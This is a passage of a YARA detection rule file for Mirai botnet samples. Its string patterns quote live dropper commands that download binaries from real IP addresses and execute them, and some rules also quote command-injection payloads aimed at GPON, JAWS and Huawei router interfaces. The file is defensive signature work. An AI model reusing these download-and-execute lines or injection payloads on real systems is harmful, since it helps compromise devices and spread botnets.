      $x4 = "wget http://196.251.71.207/armv4l -O armv4l || curl http://196.251.71.207/armv4l -o armv4l; chmod 777 armv4l; ./armv4l catloader" ascii /* score: '33.00'*/
      $x5 = "wget http://196.251.71.207/armv7l -O armv7l || curl http://196.251.71.207/armv7l -o armv7l; chmod 777 armv7l; ./armv7l catloader" ascii /* score: '33.00'*/
      $x6 = "wget http://196.251.71.207/m68k -O m68k || curl http://196.251.71.207/m68k -o m68k; chmod 777 m68k; ./m68k catloader;" fullword ascii /* score: '33.00'*/
      $x7 = "wget http://196.251.71.207/sparc -O sparc || curl http://196.251.71.207/sparc -o sparc; chmod 777 sparc; ./sparc catloader;" fullword ascii /* score: '33.00'*/
      $x8 = "wget http://196.251.71.207/armv6l -O armv6l || curl http://196.251.71.207/armv6l -o armv6l; chmod 777 armv6l; ./armv6l catloader" ascii /* score: '33.00'*/
      $x9 = "wget http://196.251.71.207/arc -O arc || curl http://196.251.71.207/arc -o arc; chmod 777 arc; ./arc catloader;" fullword ascii /* score: '33.00'*/
      $x10 = "wget http://196.251.71.207/armv5l -O armv5l || curl http://196.251.71.207/armv5l -o armv5l; chmod 777 armv5l; ./armv5l catloader" ascii /* score: '33.00'*/
      $x11 = "wget http://196.251.71.207/mips -O mips || curl http://196.251.71.207/mips -o mips; chmod 777 mips; ./mips catloader;" fullword ascii /* score: '33.00'*/
      $x12 = "wget http://196.251.71.207/mipsel -O mipsel || curl http://196.251.71.207/mipsel -o mipsel; chmod 777 mipsel; ./mipsel catloader" ascii /* score: '33.00'*/
      $x13 = "wget http://196.251.71.207/i486 -O i486 || curl http://196.251.71.207/i486 -o i486; chmod 777 i486; ./i486 catloader;" fullword ascii /* score: '33.00'*/
      $x14 = "wget http://196.251.71.207/armv7l -O armv7l || curl http://196.251.71.207/armv7l -o armv7l; chmod 777 armv7l; ./armv7l catloader" ascii /* score: '33.00'*/
      $x15 = "wget http://196.251.71.207/mipsel -O mipsel || curl http://196.251.71.207/mipsel -o mipsel; chmod 777 mipsel; ./mipsel catloader" ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      1 of ($x*)
}

rule Mirai_signature__8e97321f {
   meta:
      description = "_subset_batch - file Mirai(signature)_8e97321f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8e97321fec20d80b7e277151da1282120b8e3cb503bd354380fef0a4c14eddca"
   strings:
      $s1 = "f(__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = "Ftbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__86fe7b82 {
   meta:
      description = "_subset_batch - file Mirai(signature)_86fe7b82.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "86fe7b82efe5c94aeb8a5df3a91d9f7b41547f4c57cb9a0fc140c9a581b51be1"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__986a07ad {
   meta:
      description = "_subset_batch - file Mirai(signature)_986a07ad.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "986a07adc388af57cd46c8be70ddb5d24e4255802cf27807942159f92a364f9e"
   strings:
      $s1 = " 6!: 1<'}4668" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aFh' */
      $s2 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__7903dc0e {
   meta:
      description = "_subset_batch - file Mirai(signature)_7903dc0e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7903dc0e3cd145c534154e162ad0778aeb70c2468d74af437642a04eb4a05261"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__aaadbd1b {
   meta:
      description = "_subset_batch - file Mirai(signature)_aaadbd1b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aaadbd1b658e17b6a5c84c753646e601f994a2760366f76efe597ed7186068d7"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8911d884 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8911d884.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8911d8845bbc98d86eb12444f50dd915064030071d7d2555bd32375f5f512e35"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__7a216f43 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7a216f43.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7a216f43c5f6ebaa9b1c1a71ae11160fdb714e2fd21d8a435beace5f5731f532"
   strings:
      $s1 = "ELFErrorsrc/floods/packet_build.rs" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__88553b29 {
   meta:
      description = "_subset_batch - file Mirai(signature)_88553b29.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88553b29922c3315ee8c48c79cbfda50214569a6381d486ec05bb26277464601"
   strings:
      $s1 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s2 = "0x000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__9026cefa {
   meta:
      description = "_subset_batch - file Mirai(signature)_9026cefa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9026cefad6a007ab2b2bb2e006f81ca24dbafde975cb305cb888345749b6e24b"
   strings:
      $s1 = "ELFErrorsrc/floods/packet_build.rs" fullword ascii /* score: '12.00'*/
      $s2 = "0x000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a679b471 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a679b471.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a679b471ea272a8fdb6ac4ea785a82fa2c962caec25b55bfcc6db312acc7f17c"
   strings:
      $s1 = "0x000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__7d15b724 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7d15b724.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d15b72485362f32b29ad000720f2e64ad43a6533bb6fbe7173a625a0f39d89e"
   strings:
      $s1 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__800bd4e4 {
   meta:
      description = "_subset_batch - file Mirai(signature)_800bd4e4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "800bd4e49c9b8633a20a992748df06744937b4874860194dc7044dab2e2f2935"
   strings:
      $s1 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__7b875473 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7b875473.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7b8754730c7345952e30feb9ffd7a2e5b31eb62d2444ae50f17082149b763a0b"
   strings:
      $s1 = "(busybox wget http://160.250.134.51/mips -O- || wget http://160.250.134.51/mips -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s2 = "(busybox wget http://160.250.134.51/arm -O- || wget http://160.250.134.51/arm -O-) > .canadianpedo; chmod 777 .canadianpedo; ./." ascii /* score: '24.00'*/
      $s3 = "(busybox wget http://160.250.134.51/arm5 -O- || wget http://160.250.134.51/arm5 -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s4 = "(busybox wget http://160.250.134.51/arm -O- || wget http://160.250.134.51/arm -O-) > .canadianpedo; chmod 777 .canadianpedo; ./." ascii /* score: '24.00'*/
      $s5 = "(busybox wget http://160.250.134.51/arm7 -O- || wget http://160.250.134.51/arm7 -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s6 = "(busybox wget http://160.250.134.51/arm5 -O- || wget http://160.250.134.51/arm5 -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s7 = "(busybox wget http://160.250.134.51/aarch64 -O- || wget http://160.250.134.51/aarch64 -O-) > .canadianpedo; chmod 777 .canadianp" ascii /* score: '24.00'*/
      $s8 = "(busybox wget http://160.250.134.51/mips -O- || wget http://160.250.134.51/mips -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s9 = "(busybox wget http://160.250.134.51/mpsl -O- || wget http://160.250.134.51/mpsl -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s10 = "(busybox wget http://160.250.134.51/mpsl -O- || wget http://160.250.134.51/mpsl -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s11 = "(busybox wget http://160.250.134.51/arm7 -O- || wget http://160.250.134.51/arm7 -O-) > .canadianpedo; chmod 777 .canadianpedo; ." ascii /* score: '24.00'*/
      $s12 = "(busybox wget http://160.250.134.51/aarch64 -O- || wget http://160.250.134.51/aarch64 -O-) > .canadianpedo; chmod 777 .canadianp" ascii /* score: '24.00'*/
      $s13 = "rm /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s14 = "cp /bin/busybox /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s15 = "cd /tmp;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__83c87379 {
   meta:
      description = "_subset_batch - file Mirai(signature)_83c87379.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "83c873795fffc6dd47ef3f5742a24481f3144985ed77cc95a244e4d0ce6f6471"
   strings:
      $s1 = "wget http://103.153.69.151/arm5 || busybox wget http://103.153.69.151/arm5; chmod 777 arm5; ./arm5 massload;" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://103.153.69.151/mips || busybox wget http://103.153.69.151/mips; chmod 777 mips; ./mips massload;" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://103.153.69.151/arm || busybox wget http://103.153.69.151/arm; chmod 777 arm; ./arm massload;" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://103.153.69.151/mpsl || busybox wget http://103.153.69.151/mpsl; chmod 777 mpsl; ./mpsl massload;" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://103.153.69.151/arm7 || busybox wget http://103.153.69.151/arm7; chmod 777 arm7; ./arm7 massload;" fullword ascii /* score: '20.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s8 = "rm /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s9 = "cp /bin/busybox /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s12 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s13 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s14 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s15 = "rm mips mpsl arm* busybox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__9061e745 {
   meta:
      description = "_subset_batch - file Mirai(signature)_9061e745.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9061e74503dbb8fc817a8a6becee75ca49e2bbe27698cde36f8f89c2c1f9f1a1"
   strings:
      $s1 = "wget http://193.17.183.25/arm5 || busybox wget http://193.17.183.25/arm5; chmod 777 arm5; ./arm5 massload;" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://193.17.183.25/arm6 || busybox wget http://193.17.183.25/arm6; chmod 777 arm6; ./arm6 massload;" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://193.17.183.25/arm7 || busybox wget http://193.17.183.25/arm7; chmod 777 arm7; ./arm7 massload;" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://193.17.183.25/mpsl || busybox wget http://193.17.183.25/mpsl; chmod 777 mpsl; ./mpsl massload;" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://193.17.183.25/arm4 || busybox wget http://193.17.183.25/arm4; chmod 777 arm4; ./arm4 massload;" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://193.17.183.25/mips || busybox wget http://193.17.183.25/mips; chmod 777 mips; ./mips massload;" fullword ascii /* score: '20.00'*/
      $s7 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s8 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s9 = "rm /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s10 = "cp /bin/busybox /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s11 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s12 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s13 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s14 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s15 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__a4ebfeb0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a4ebfeb0.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a4ebfeb0a46755804c7279c30447b9f86862ddfbd18f43c1014654734c1802c3"
   strings:
      $s1 = "(busybox wget http://160.250.134.51/arm7 -O- || wget http://160.250.134.51/arm7 -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s2 = "(busybox wget http://160.250.134.51/mips -O- || wget http://160.250.134.51/mips -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s3 = "(busybox wget http://160.250.134.51/arm -O- || wget http://160.250.134.51/arm -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed hy" ascii /* score: '28.00'*/
      $s4 = "(busybox wget http://160.250.134.51/arm5 -O- || wget http://160.250.134.51/arm5 -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s5 = "(busybox wget http://160.250.134.51/mpsl -O- || wget http://160.250.134.51/mpsl -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s6 = "(busybox wget http://160.250.134.51/arm -O- || wget http://160.250.134.51/arm -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed hy" ascii /* score: '28.00'*/
      $s7 = "(busybox wget http://160.250.134.51/mips -O- || wget http://160.250.134.51/mips -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s8 = "(busybox wget http://160.250.134.51/arm5 -O- || wget http://160.250.134.51/arm5 -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s9 = "(busybox wget http://160.250.134.51/arm7 -O- || wget http://160.250.134.51/arm7 -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s10 = "(busybox wget http://160.250.134.51/mpsl -O- || wget http://160.250.134.51/mpsl -O-) > .hibreed; chmod 777 .hibreed; ./.hibreed " ascii /* score: '28.00'*/
      $s11 = "rm /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s12 = "cp /bin/busybox /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s13 = "cd /tmp;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__ac47c50a {
   meta:
      description = "_subset_batch - file Mirai(signature)_ac47c50a.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ac47c50ac033e54a3aab50ad3be7864f65171e0a11c41499cc5ac3fc017d67cb"
   strings:
      $s1 = "wget http://160.250.134.51/arm7 || busybox wget http://160.250.134.51/arm7; chmod 777 arm7; ./arm7 mass.weed;" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://160.250.134.51/mpsl || busybox wget http://160.250.134.51/mpsl; chmod 777 mpsl; ./mpsl mass.weed;" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://160.250.134.51/arm5 || busybox wget http://160.250.134.51/arm5; chmod 777 arm5; ./arm5 mass.weed;" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://160.250.134.51/mips || busybox wget http://160.250.134.51/mips; chmod 777 mips; ./mips mass.weed;" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://160.250.134.51/arm || busybox wget http://160.250.134.51/arm; chmod 777 arm; ./arm mass.weed;" fullword ascii /* score: '20.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s8 = "rm /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s9 = "cp /bin/busybox /tmp/busybox;" fullword ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s12 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s13 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s14 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s15 = "rm mips mpsl arm* busybox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__7daf78f6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7daf78f6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7daf78f623fe8f70b8f5899278a9e1ec55d9eeec142320d6b6d137a9fcabe579"
   strings:
      $s1 = " 6!: 1<'}4668" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aFh' */
      $s2 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__87bb4e94 {
   meta:
      description = "_subset_batch - file Mirai(signature)_87bb4e94.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "87bb4e94aacd4a3f16b5d59e41f00831610b51b238c26d500d26e1b7b4b557d8"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8c0c0a31 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8c0c0a31.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8c0c0a3165b251e5e8229d610bcad88c76f9bc23097fb992bbd44a778260d199"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a754c4ba {
   meta:
      description = "_subset_batch - file Mirai(signature)_a754c4ba.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a754c4ba49d51ef1dc6b90f426e06c03ca4f2b39209b202693e22731a462dfe7"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a0d6efbe {
   meta:
      description = "_subset_batch - file Mirai(signature)_a0d6efbe.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a0d6efbe71e7e31b3cf16e471ea8a1540b29c92675c8e2b796683628a7a650f1"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "UUUVGET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "LPOST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s11 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s12 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s13 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s14 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s15 = "tvmrepa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__88e981c2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_88e981c2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88e981c2f267eaefe466d1087883f094359ba13b5166792777c9a66ecd2acf53"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__96cbf7ff {
   meta:
      description = "_subset_batch - file Mirai(signature)_96cbf7ff.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "96cbf7ffe001c0360f86cff1756ec8c39309df46108ce7c1d23d712d41f40805"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__a710aad6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a710aad6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a710aad6e4d39b8bd3cd0879bec8d4479858bd4dfa3e8f24230bc3f0ae9f0118"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__81dd5cc9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_81dd5cc9.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "81dd5cc988d10607beab49bef837fb526eb279d3d7d0d95e990bb8db3114bcd9"
   strings:
      $s1 = "busybox wget http://161.97.106.129/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '23.00'*/
      $s2 = "busybox wget http://161.97.106.129/systemcl/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '23.00'*/
      $s3 = "busybox wget http://161.97.106.129/systemcl/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '23.00'*/
      $s4 = "busybox wget http://161.97.106.129/systemcl/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '23.00'*/
      $s5 = "busybox wget http://161.97.106.129/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '23.00'*/
      $s6 = "busybox wget http://161.97.106.129/systemcl/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '23.00'*/
      $s7 = "busybox wget http://161.97.106.129/systemcl/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '23.00'*/
      $s8 = "busybox wget http://161.97.106.129/systemcl/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '23.00'*/
      $s9 = "busybox wget http://161.97.106.129/systemcl/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '23.00'*/
      $s10 = "busybox wget http://161.97.106.129/systemcl/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '23.00'*/
      $s11 = "busybox wget http://161.97.106.129/systemcl/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '23.00'*/
      $s12 = "busybox wget http://161.97.106.129/systemcl/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__820cce21 {
   meta:
      description = "_subset_batch - file Mirai(signature)_820cce21.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "820cce2166144117dc1067b7575cb9270edf76018918f8c7125e667e45114f14"
   strings:
      $s1 = "wget http://103.153.69.151/arm7; chmod 777 arm7; ./arm7 ipcam.tplink; rm arm7" fullword ascii /* score: '16.00'*/
      $s2 = "wget http://103.153.69.151/mpsl; chmod 777 mpsl; ./mpsl ipcam.tplink; rm mpsl" fullword ascii /* score: '16.00'*/
      $s3 = "wget http://103.153.69.151/arm; chmod 777 arm; ./arm ipcam.tplink; rm arm" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://103.153.69.151/arm5; chmod 777 arm5; ./arm5 ipcam.tplink; rm arm5" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://103.153.69.151/arm4; chmod 777 arm4; ./arm4 ipcam.tplink; rm arm4" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://103.153.69.151/arm6; chmod 777 arm6; ./arm6 ipcam.tplink; rm arm6" fullword ascii /* score: '16.00'*/
      $s7 = "wget http://103.153.69.151/mips; chmod 777 mips; ./mips ipcam.tplink; rm mips" fullword ascii /* score: '16.00'*/
      $s8 = "wget http://103.153.69.151/x86; chmod 777 x86; ./x86 ipcam.tplink; rm x86" fullword ascii /* score: '16.00'*/
      $s9 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule Mirai_signature__8555eff2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8555eff2.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
